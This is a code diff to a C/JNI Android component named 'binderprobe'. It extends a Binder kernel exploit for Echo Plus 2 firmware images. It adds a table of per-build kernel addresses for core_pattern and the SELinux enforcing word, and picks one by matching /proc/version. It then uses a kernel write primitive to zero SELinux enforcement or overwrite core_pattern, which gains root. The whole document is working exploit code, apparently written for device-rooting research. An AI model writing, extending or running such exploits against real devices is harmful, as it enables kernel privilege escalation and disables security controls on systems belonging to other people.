@@ -1,4 +1,4 @@
-/* Binder primitive for the tested 8338N cold-boot path.
+/* Binder primitive for the captured Echo Plus 2 kernel images.
  *
  * Read the JNI function below from top to bottom. Each invocation first
  * retains a 96-byte datagram that reveals a constrained kernel pointer, then
@@ -6,8 +6,74 @@
  * Android calls it twice: mode 5 writes four zero bytes to the checked
  * SELinux enforcing word; after readback, mode 3 writes the checked
  * core_pattern qword. No other target modes are accepted. Project Zero
- * explains the general Binder bug; guards and targets are Plus-2-specific.
+ * explains the general Binder bug. The other image paths are statically
+ * mapped here but have not yet been reproduced on their own hardware.
  */
+
+struct compose_kernel_profile {
+    int id;
+    const char *version;
+    uint64_t core_pattern;
+    uint64_t enforcing;
+};
+
+enum {
+    PROFILE_NS6575_8338N = 1,
+    PROFILE_NS6536_2509N = 2,
+    PROFILE_NS6541_2965N = 3,
+    PROFILE_NS65741_8149N = 4,
+};
+
+/* Chronological by the compile timestamp embedded in each kernel image. */
+static const struct compose_kernel_profile compose_profiles[] = {
+    {PROFILE_NS6536_2509N,
+     "Linux version 4.4.22+ (build@i3-ri-14-use1a-b-87) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Fri Mar 6 00:31:15 UTC 2020",
+     UINT64_C(0xffffff8008c80d18), UINT64_C(0xffffff8008d571c4)},
+    {PROFILE_NS6541_2965N,
+     "Linux version 4.4.22+ (build@i3-ri-14-use1a-b-107) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Oct 12 00:47:38 UTC 2020",
+     UINT64_C(0xffffff8008c84d18), UINT64_C(0xffffff8008d5b1c4)},
+    {PROFILE_NS65741_8149N,
+     "Linux version 4.4.22+ (build@548150beea09) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Sep 28 00:55:05 UTC 2026",
+     UINT64_C(0xffffff8008b59398), UINT64_C(0xffffff8008c301c4)},
+    {PROFILE_NS6575_8338N,
+     "Linux version 4.4.22+ (build@eeeac6b62036) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Wed Oct 14 06:19:16 UTC 2026",
+     UINT64_C(0xffffff8008b59398), UINT64_C(0xffffff8008c301c4)},
+};
+
+static const struct compose_kernel_profile *compose_checked_profile(int id) {
+    /* Keep the tested 8338N native path independent of /proc/version. */
+    if (id == PROFILE_NS6575_8338N) {
+        for (size_t i = 0; i < sizeof(compose_profiles) / sizeof(compose_profiles[0]); ++i)
+            if (compose_profiles[i].id == id) return &compose_profiles[i];
+        return NULL;
+    }
+    FILE *file = fopen("/proc/version", "r");
+    if (!file) return NULL;
+    char line[256];
+    char *read_result = fgets(line, sizeof(line), file);
+    fclose(file);
+    if (!read_result) return NULL;
+    char *newline = strchr(line, '\n');
+    if (!newline) return NULL;
+    *newline = '\0';
+    for (size_t i = 0; i < sizeof(compose_profiles) / sizeof(compose_profiles[0]); ++i)
+        if (compose_profiles[i].id == id &&
+            strcmp(compose_profiles[i].version, line) == 0)
+            return &compose_profiles[i];
+    return NULL;
+}
+
+JNIEXPORT jint JNICALL
+Java_org_local_lidar_binderprobe_KernelProfile_nativeProfileId(
+    JNIEnv *env, jclass klass) {
+    (void)env;
+    (void)klass;
+    for (size_t i = 0; i < sizeof(compose_profiles) / sizeof(compose_profiles[0]); ++i) {
+        int id = compose_profiles[i].id;
+        if (id != PROFILE_NS6575_8338N && compose_checked_profile(id)) return id;
+    }
+    return 0;
+}
 
 static int compose_read_core_pattern(char value[16]) {
     int fd = open("/proc/sys/kernel/core_pattern", O_RDONLY | O_CLOEXEC);
@@ -93,7 +159,7 @@ static int compose_sleep_ms(long milliseconds) {
 JNIEXPORT jstring JNICALL
 Java_org_local_lidar_binderprobe_ProbeService_nativeComposeHeldPacketAfterPending(
     JNIEnv *env, jclass klass, jint handle, jint expected_binder,
-    jint target_mode,
+    jint target_mode, jint profile_id,
     jstring executable) {
     (void)klass;
     char result[640] = "compose_not_started";
@@ -114,15 +180,16 @@ Java_org_local_lidar_binderprobe_ProbeService_nativeComposeHeldPacketAfterPendin
     int64_t first_seen_ms = -1, retained_at_ms = -1;
     int64_t second_del_at_ms = -1, final_peek_at_ms = -1, consumed_at_ms = -1;
     const long parent_tid = (long)syscall(__NR_gettid);
+    const struct compose_kernel_profile *profile = compose_checked_profile(profile_id);
     const uint8_t original8[8] = {'O','R','I','G','D','A','T','A'};
     const uint8_t first8[8] = {'F','I','R','S','T','0','8','_'};
     uint8_t marker8[8] = {0};
     int64_t overall_start_ms = monotonic_milliseconds();
 
     /* 1. Fail closed on the selected mode, Binder handle and helper path. */
-    if ((target_mode != 3 && target_mode != 5) ||
+    if (!profile || (target_mode != 3 && target_mode != 5) ||
         handle <= 0 || handle >= 100000 || access(path, X_OK) != 0) {
-        snprintf(result, sizeof(result), "compose_preflight_handle_or_exec_errno_%d", errno);
+        snprintf(result, sizeof(result), "compose_preflight_profile_handle_or_exec_errno_%d", errno);
         goto done;
     }
     binder = compose_find_binder_fd();
@@ -365,9 +432,7 @@ Java_org_local_lidar_binderprobe_ProbeService_nativeComposeHeldPacketAfterPendin
     second_del_at_ms = monotonic_milliseconds();
 
     /* 6. Select only a checked image-specific destination in boot modes. */
-    write_target = target_mode == 3
-        ? UINT64_C(0xffffff8008b59398)
-        : UINT64_C(0xffffff8008c301c4);
+    write_target = target_mode == 3 ? profile->core_pattern : profile->enforcing;
     const uint64_t middle16[2] = {24, write_target};
     if (send(data[0], middle16, sizeof(middle16), MSG_NOSIGNAL) != sizeof(middle16) ||
         compose_sleep_ms(10) != 0) {
